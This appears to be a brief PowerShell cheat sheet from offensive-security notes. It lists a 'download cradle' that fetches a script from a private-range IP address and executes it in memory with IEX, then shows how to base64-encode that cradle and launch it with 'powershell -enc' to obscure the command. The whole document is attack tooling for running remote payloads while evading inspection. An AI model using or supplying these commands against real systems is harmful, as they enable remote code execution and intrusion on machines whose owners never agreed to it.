# Powershell CheatSheet
## Powershell Download Cradles
```
IEX(New-Object Net.WebClient).downloadString('http://192.168.49.88/run.ps1')
```

## Base64 Encode
```
$cmd = ""
$cmd = "IEX(New-Object Net.WebClient).downloadString('http://192.168.49.182/run.ps1')"
$bin = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$enc = [Convert]::ToBase64String($bin)
$enc

powershell -enc "fewfweioajewjef=="
```
